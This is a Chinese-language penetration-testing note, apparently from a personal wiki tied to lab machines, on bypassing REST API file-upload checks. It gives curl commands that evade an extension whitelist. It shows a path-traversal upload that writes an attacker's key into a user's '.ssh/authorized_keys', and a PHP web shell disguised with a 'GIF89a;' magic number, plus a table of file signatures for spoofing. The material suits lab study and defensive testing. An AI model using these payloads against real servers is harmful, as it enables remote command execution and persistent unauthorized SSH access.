# REST API 檔案上傳繞過與路徑穿越

在對 REST API 進行測試時，若發現檔案上傳功能，除了常見的副檔名繞過外，還常結合路徑穿越（Path Traversal）將檔案寫入任意目錄。

## 💥 REST API 檔案上傳繞過與路徑穿越

當 API 後端在處理多部分表單資料（Multipart Form-Data）時，可能對 `file` 參數中的檔案副檔名進行了白名單過濾，但在寫入磁碟時，卻直接使用了未過濾的 `filename` 參數或自訂表單欄位。

### 繞過手法與步驟

1. **確認上傳參數與限制**
   先上傳任意檔案測試 API 反應：
   ```bash
   curl http://<TARGET_IP>:<PORT>/file-upload -F "file=@test"
   # 回傳: {"message":"No filename part in the request"}
   ```
   如果發現需要額外的 `filename` 參數，補上後可能遇到副檔名限制：
   ```bash
   curl http://<TARGET_IP>:<PORT>/file-upload -F "file=@test" -F "filename=test"
   # 回傳: {"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
   ```

2. **副檔名白名單繞過**
   將要上傳的惡意檔案（例如 `id_rsa.pub`）先在本地命名為允許的副檔名（如 `.txt`），但在 `filename` 參數中指定想要的目標檔名：
   ```bash
   mv id_rsa.pub authorized_keys.txt
   curl -X POST http://<TARGET_IP>:<PORT>/file-upload -F "file=@authorized_keys.txt" -F "filename=authorized_keys"
   ```

3. **結合路徑穿越 (Path Traversal)**
   若 `filename` 參數未在後端進行安全過濾（如過濾 `../`），可直接利用相對路徑將檔案寫入特定目錄（例如目標使用者的 SSH 目錄）：
   ```bash
   curl -X POST http://<TARGET_IP>:<PORT>/file-upload \
     -F "file=@authorized_keys.txt" \
     -F "filename=../home/<USER>/.ssh/authorized_keys"
   ```

## 💥 Magic Number 與文件簽名繞過
當後端伺服器除了驗證副檔名外，還會透過讀取檔案頭部特徵（Magic Number / File Signature）來判斷檔案類型（例如利用 `getimagesize()` 或 MIME type 驗證），可藉由在惡意程式（如 PHP Web Shell）首行偽造 Magic Number 來進行繞過。

### 🛠️ 利用方法與常見 Magic Number
以 PHP Web Shell 上傳為例，可在 Shell 程式碼的最前方手動寫入相應的 Magic Number，使其偽裝為合法圖片檔案：

| 目標類型 | Magic Number / File Signature |
| --- | --- |
| **GIF** | `GIF89a;` |
| **PNG** | `\x89PNG\r\n\x1a\n` |
| **JPG** | `\xFF\xD8\xFF` |

* **範例：偽裝成 GIF 的 PHP Web Shell (`shell.php`)**：
  ```php
  GIF89a;
  <?php system($_GET['cmd']); ?>
  ```
  上傳後，伺服器若僅檢查檔案頭部特徵與 MIME，會將其視為 GIF 圖片並允許上傳，但當該檔案以 `.php` 副檔名被解析並執行時，依然會觸發惡意的 PHP 程式碼。

# 實戰關聯
- [[Amaterasu]]
- [[Blogger]] (利用 wpDiscuz 留言板外掛上傳圖片時，在 PHP Shell 前端注入 `GIF89a;` Magic Number 繞過上傳限制)
